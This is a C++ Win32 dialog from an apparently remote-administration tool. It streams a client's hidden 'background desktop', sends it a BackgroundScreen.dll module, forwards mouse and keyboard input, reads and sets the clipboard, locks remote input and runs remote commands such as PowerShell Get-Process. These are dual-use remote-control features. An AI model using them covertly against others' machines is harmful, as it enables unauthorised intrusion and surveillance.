// BackgroundDialog.cpp - 后台桌面管理对话框实现
#include "BackgroundDialog.h"
#include "../resource.h"
#include "../GlobalState.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include <CommCtrl.h>
#include <shlwapi.h>
#include <windowsx.h>
#include <vector>
#include <map>
#include <mutex>
#include <memory>
#include <string>
#include "../Utils/StringHelper.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shlwapi.lib")

extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern void AddLog(const std::wstring& type, const std::wstring& msg);
extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);
extern bool SendModuleToClient(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2 = 0);

namespace Formidable {
namespace UI {

struct BackgroundState {
    uint32_t clientId = 0;
    int fps = 15;
    int quality = 0; // 0=1080p, 1=Original
    int compress = 1; // 0=Raw, 1=JPEG
    int captureMethod = 1; // 0=GDI, 1=DXGI (默认 DXGI)
    bool isControlEnabled = false;
    bool isStretched = true;
    int remoteWidth = 0;
    int remoteHeight = 0;
};

static std::map<HWND, BackgroundState> s_backgroundStates;

// 后台屏幕子类化过程 (类似于 DesktopScreenProc)
LRESULT CALLBACK BackgroundScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    uint32_t cid = (uint32_t)uIdSubclass; 
    HWND hDlg = (HWND)dwRefData;
    
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(cid)) client = g_Clients[cid];
    }

    if (s_backgroundStates.find(hDlg) == s_backgroundStates.end()) {
        return DefSubclassProc(hWnd, message, wParam, lParam);
    }
    BackgroundState& state = s_backgroundStates[hDlg];

    if (message == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        
        HBITMAP hBmp = (HBITMAP)SendMessage(hWnd, STM_GETIMAGE, IMAGE_BITMAP, 0);
        if (hBmp) {
            HDC hMemDC = CreateCompatibleDC(hdc);
            HBITMAP hOldBmp = (HBITMAP)SelectObject(hMemDC, hBmp);
            BITMAP bmp;
            GetObject(hBmp, sizeof(BITMAP), &bmp);

            state.remoteWidth = bmp.bmWidth;
            state.remoteHeight = bmp.bmHeight;
            
            if (state.isStretched) {
                SetStretchBltMode(hdc, HALFTONE);
                StretchBlt(hdc, 0, 0, rc.right, rc.bottom, hMemDC, 0, 0, bmp.bmWidth, bmp.bmHeight, SRCCOPY);
            } else {
                BitBlt(hdc, 0, 0, rc.right, rc.bottom, hMemDC, 0, 0, SRCCOPY);
            }
            
            SelectObject(hMemDC, hOldBmp);
            DeleteDC(hMemDC);
        } else {
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            SetTextColor(hdc, RGB(255, 255, 255));
            SetBkMode(hdc, TRANSPARENT);
            DrawTextW(hdc, L"正在等待后台画面...", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }
        
        EndPaint(hWnd, &ps);
        return 0;
    }

    // 处理控制事件
    if (client) {
        bool shouldSend = false;
        BackgroundCmdData cmdData = { 0 };
        RECT rc;
        GetClientRect(hWnd, &rc);

        switch (message) {
            case WM_MOUSEMOVE:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 0;
                if (state.isStretched && rc.right > 0 && rc.bottom > 0) {
                    cmdData.x = (int)((float)GET_X_LPARAM(lParam) / rc.right * state.remoteWidth);
                    cmdData.y = (int)((float)GET_Y_LPARAM(lParam) / rc.bottom * state.remoteHeight);
                } else {
                    cmdData.x = GET_X_LPARAM(lParam);
                    cmdData.y = GET_Y_LPARAM(lParam);
                }
                shouldSend = true;
                break;
            case WM_LBUTTONDOWN:
            case WM_LBUTTONDBLCLK:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 1; // Always send as DOWN
                shouldSend = true;
                break;
            case WM_LBUTTONUP:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 2;
                shouldSend = true;
                break;
            case WM_RBUTTONDOWN:
            case WM_RBUTTONDBLCLK:
                if (!state.isControlEnabled) {
                    // 如果未启用控制，右键点击允许弹出菜单
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 3; // Always send as DOWN
                shouldSend = true;
                break;
            case WM_RBUTTONUP:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 4;
                shouldSend = true;
                break;
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 5;
                cmdData.arg1 = (uint32_t)wParam;
                shouldSend = true;
                break;
            case WM_KEYUP:
            case WM_SYSKEYUP:
                if (!state.isControlEnabled) {
                    return DefSubclassProc(hWnd, message, wParam, lParam);
                }
                cmdData.type = 6;
                cmdData.arg1 = (uint32_t)wParam;
                shouldSend = true;
                break;
        }

        if (shouldSend) {
            uint32_t dataLen = sizeof(BackgroundCmdData);
            uint32_t originLen = sizeof(CommandPkg) - 1 + dataLen;
            uint32_t pkgSize = sizeof(PkgHeader) + originLen;
            std::vector<uint8_t> buffer(pkgSize);

            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = originLen;
            header->totalLen = pkgSize;

            CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
            pkg->cmd = CMD_BACKGROUND_SCREEN_CONTROL;
            pkg->arg1 = dataLen;
            memcpy(pkg->data, &cmdData, dataLen);

            SendDataToClient(client, buffer.data(), (int)buffer.size());
            return 0; // 拦截消息
        }
    }

    return DefSubclassProc(hWnd, message, wParam, lParam);
}

INT_PTR CALLBACK BackgroundDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        BackgroundState state;
        state.clientId = clientId;
        s_backgroundStates[hDlg] = state;

        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }

        if (client) {
            client->hBackgroundDlg = hDlg; // 记录窗口句柄
            
            std::wstring title = L"后台桌面管理 - " + Formidable::Utils::StringHelper::UTF8ToWide(client->info.computerName);
            SetWindowTextW(hDlg, title.c_str());
            
            // 子类化屏幕显示控件
            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_BACK_SCREEN);
            if (hStatic) {
                // 确保静态控件可以接收鼠标消息
                LONG style = GetWindowLong(hStatic, GWL_STYLE);
                SetWindowLong(hStatic, GWL_STYLE, style | SS_NOTIFY);

                SetWindowSubclass(hStatic, BackgroundScreenProc, clientId, (DWORD_PTR)hDlg);
            }

            // 发送后台屏幕模块到客户端
            SendModuleToClient(clientId, CMD_BACKGROUND_CREATE, L"BackgroundScreen.dll");
            
            // 默认发送 DXGI 切换指令 (如果状态初始值为 1)
            BackgroundState& state = s_backgroundStates[hDlg];
            if (state.captureMethod == 1) {
                // 延迟一会发送，确保模块加载完成
                std::thread([clientId, hDlg]() {
                    Sleep(2000);
                    std::shared_ptr<Formidable::ConnectedClient> c;
                    {
                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        if (g_Clients.count(clientId)) c = g_Clients[clientId];
                    }
                    if (c && c->hBackgroundDlg == hDlg) {
                        Formidable::CommandPkg pkg = { 0 };
                        pkg.cmd = CMD_SCREEN_QUALITY;
                        pkg.arg1 = 11; // DXGI
                        
                        size_t bodySize = sizeof(Formidable::CommandPkg);
                        std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                        Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                        memcpy(header->flag, "FRMD26?", 7);
                        header->originLen = (int)bodySize;
                        header->totalLen = (int)buffer.size();
                        memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                        SendDataToClient(c, buffer.data(), (int)buffer.size());
                    }
                }).detach();
            }
        }
        return (INT_PTR)TRUE;
    }

    case WM_SIZE: {
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_BACK_SCREEN);
        if (hStatic) {
            RECT rc;
            GetClientRect(hDlg, &rc);
            MoveWindow(hStatic, 0, 0, rc.right, rc.bottom, TRUE);
        }
        return (INT_PTR)TRUE;
    }

    case WM_CONTEXTMENU: {
        POINT pt;
        if (lParam == -1) {
            GetCursorPos(&pt);
        } else {
            pt.x = GET_X_LPARAM(lParam);
            pt.y = GET_Y_LPARAM(lParam);
        }

        BackgroundState& state = s_backgroundStates[hDlg];
        HMENU hMenu = CreatePopupMenu();
        HMENU hFpsMenu = CreatePopupMenu();
        HMENU hResMenu = CreatePopupMenu();
        HMENU hCompMenu = CreatePopupMenu();
        HMENU hMethodMenu = CreatePopupMenu();
        HMENU hCmdMenu = CreatePopupMenu();
        HMENU hPsMenu = CreatePopupMenu();

        // FPS子菜单
        AppendMenuW(hFpsMenu, (state.fps == 5 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_5, L"5 FPS");
        AppendMenuW(hFpsMenu, (state.fps == 10 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_10, L"10 FPS");
        AppendMenuW(hFpsMenu, (state.fps == 15 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_15, L"15 FPS");
        AppendMenuW(hFpsMenu, (state.fps == 20 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_20, L"20 FPS");
        AppendMenuW(hFpsMenu, (state.fps == 25 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_25, L"25 FPS");
        AppendMenuW(hFpsMenu, (state.fps == 30 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_30, L"30 FPS");

        // 分辨率子菜单
        AppendMenuW(hResMenu, (state.quality == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_ORIGINAL, L"原始分辨率");
        AppendMenuW(hResMenu, (state.quality == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_1080P, L"1080P");

        // 采集方式子菜单
        AppendMenuW(hMethodMenu, (state.captureMethod == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CAPTURE_GDI, L"GDI 兼容模式");
        AppendMenuW(hMethodMenu, (state.captureMethod == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CAPTURE_DXGI, L"DXGI 高速模式");

        // 压缩方案子菜单
        AppendMenuW(hCompMenu, (state.compress == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_RAW, L"未压缩 (RAW)");
        AppendMenuW(hCompMenu, (state.compress == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_JPEG, L"高效压缩 (JPEG)");

        // CMD快捷命令
        AppendMenuW(hCmdMenu, MF_STRING, IDM_DESKTOP_CMD_COMMANDS + 1, L"打开记事本");
        AppendMenuW(hCmdMenu, MF_STRING, IDM_DESKTOP_CMD_COMMANDS + 2, L"打开计算器");
        AppendMenuW(hCmdMenu, MF_STRING, IDM_DESKTOP_CMD_COMMANDS + 3, L"打开任务管理器");

        // PowerShell快捷命令
        AppendMenuW(hPsMenu, MF_STRING, IDM_DESKTOP_POWERSHELL_COMMANDS + 1, L"获取进程列表");
        AppendMenuW(hPsMenu, MF_STRING, IDM_DESKTOP_POWERSHELL_COMMANDS + 2, L"获取服务状态");

        // 主菜单
        AppendMenuW(hMenu, (state.isControlEnabled ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CONTROL, L"控制屏幕(&C)");
        AppendMenuW(hMenu, (state.isStretched ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_STRETCH, L"拉伸显示(&S)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hFpsMenu, L"帧率设置(&P)");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hResMenu, L"分辨率(&E)");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hMethodMenu, L"采集方式(&M)");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hCompMenu, L"压缩方案(&2)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_LOCK_INPUT, L"锁定输入()");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SWITCH_MONITOR, L"切换显示器(&M)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_GET_CLIPBOARD, L"获取剪贴板(&G)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SET_CLIPBOARD, L"设置剪贴板(&B)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hCmdMenu, L"CMD快捷命令");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hPsMenu, L"powershell快捷命令");

        TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
        DestroyMenu(hMenu);
        return (INT_PTR)TRUE;
    }

    case WM_COMMAND: {
        int id = LOWORD(wParam);
        auto it = s_backgroundStates.find(hDlg);
        if (it == s_backgroundStates.end()) break;
        BackgroundState& state = it->second;

        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(state.clientId)) client = g_Clients[state.clientId];
        }
        if (!client) break;

        auto SendCommand = [&](uint32_t cmd, uint32_t arg1 = 0, uint32_t arg2 = 0) {
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = cmd;
            pkg.arg1 = arg1;
            pkg.arg2 = arg2;
            
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        };

        auto SendExecute = [&](const std::string& cmdUtf8) {
            uint32_t dataLen = (uint32_t)cmdUtf8.length() + 1;
            uint32_t originLen = sizeof(CommandPkg) - 1 + dataLen;
            uint32_t pkgSize = sizeof(PkgHeader) + originLen;
            std::vector<uint8_t> buffer(pkgSize);
            
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = originLen;
            header->totalLen = pkgSize;
            
            CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
            pkg->cmd = CMD_BACKGROUND_EXECUTE;
            pkg->arg1 = dataLen;
            pkg->arg2 = 0;
            memcpy(pkg->data, cmdUtf8.c_str(), dataLen);
            
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        };

        if (id >= IDM_DESKTOP_FPS_5 && id <= IDM_DESKTOP_FPS_30) {
            state.fps = 5 + (id - IDM_DESKTOP_FPS_5) * 5;
            SendCommand(CMD_SCREEN_FPS, state.fps);
            return (INT_PTR)TRUE;
        }

        switch (id) {
        case IDM_DESKTOP_CONTROL:
            state.isControlEnabled = !state.isControlEnabled;
            AddLog(L"后台屏幕", state.isControlEnabled ? L"已启用后台键鼠控制" : L"已禁用后台键鼠控制");
            break;
        case IDM_DESKTOP_STRETCH:
            state.isStretched = !state.isStretched;
            InvalidateRect(GetDlgItem(hDlg, IDC_STATIC_BACK_SCREEN), NULL, FALSE);
            break;
        case IDM_DESKTOP_RES_ORIGINAL:
            state.quality = 1;
            SendCommand(CMD_SCREEN_QUALITY, 1);
            break;
        case IDM_DESKTOP_RES_1080P:
            state.quality = 0;
            SendCommand(CMD_SCREEN_QUALITY, 0);
            break;
        case IDM_DESKTOP_COMPRESS_RAW:
            state.compress = 0;
            SendCommand(CMD_SCREEN_COMPRESS, 0);
            break;
        case IDM_DESKTOP_COMPRESS_JPEG:
            state.compress = 1;
            SendCommand(CMD_SCREEN_COMPRESS, 1);
            break;
        case IDM_DESKTOP_CAPTURE_GDI:
            state.captureMethod = 0;
            SendCommand(CMD_SCREEN_QUALITY, 10);
            break;
        case IDM_DESKTOP_CAPTURE_DXGI:
            state.captureMethod = 1;
            SendCommand(CMD_SCREEN_QUALITY, 11);
            break;
        case IDM_DESKTOP_LOCK_INPUT:
            SendCommand(CMD_SCREEN_QUALITY, 4); // 4=锁定输入
            break;
        case IDM_DESKTOP_SWITCH_MONITOR:
            SendCommand(CMD_SWITCH_MONITOR);
            break;
        case IDM_DESKTOP_GET_CLIPBOARD:
            SendCommand(CMD_CLIPBOARD_GET);
            break;
        case IDM_DESKTOP_SET_CLIPBOARD:
            if (OpenClipboard(hDlg)) {
                HANDLE hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* pText = (wchar_t*)GlobalLock(hData);
                    if (pText) {
                        std::string utf8 = Formidable::Utils::StringHelper::WideToUTF8(pText);
                        uint32_t dataLen = (uint32_t)utf8.length() + 1;
                        uint32_t originLen = sizeof(CommandPkg) - 1 + dataLen;
                        uint32_t pkgSize = sizeof(PkgHeader) + originLen;
                        std::vector<uint8_t> buffer(pkgSize);
                        
                        PkgHeader* header = (PkgHeader*)buffer.data();
                        memcpy(header->flag, "FRMD26?", 7);
                        header->originLen = originLen;
                        header->totalLen = pkgSize;
                        
                        CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                        pkg->cmd = CMD_CLIPBOARD_SET;
                        pkg->arg1 = dataLen;
                        pkg->arg2 = 0;
                        memcpy(pkg->data, utf8.c_str(), dataLen);
                        
                        SendDataToClient(client, buffer.data(), (int)buffer.size());
                        GlobalUnlock(hData);
                        AddLog(L"剪贴板", L"已发送本地剪贴板到远程");
                    }
                }
                CloseClipboard();
            }
            break;
        case IDM_DESKTOP_CMD_COMMANDS + 1: SendExecute("notepad.exe"); break;
        case IDM_DESKTOP_CMD_COMMANDS + 2: SendExecute("calc.exe"); break;
        case IDM_DESKTOP_CMD_COMMANDS + 3: SendExecute("taskmgr.exe"); break;
        case IDM_DESKTOP_POWERSHELL_COMMANDS + 1: SendExecute("powershell.exe -Command Get-Process"); break;
        case IDM_DESKTOP_POWERSHELL_COMMANDS + 2: SendExecute("powershell.exe -Command Get-Service"); break;

        case IDCANCEL:
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }

    case WM_DESTROY:
        s_backgroundStates.erase(hDlg);
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            for (auto& pair : g_Clients) {
                if (pair.second->hBackgroundDlg == hDlg) {
                    pair.second->hBackgroundDlg = NULL;
                    break;
                }
            }
        }
        break;
    }
    return (INT_PTR)FALSE;
}

HWND BackgroundDialog::Show(HWND hParent, uint32_t clientId) {
    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_BACKGROUND), hParent, DlgProc, (LPARAM)clientId);
}

} // namespace UI
} // namespace Formidable
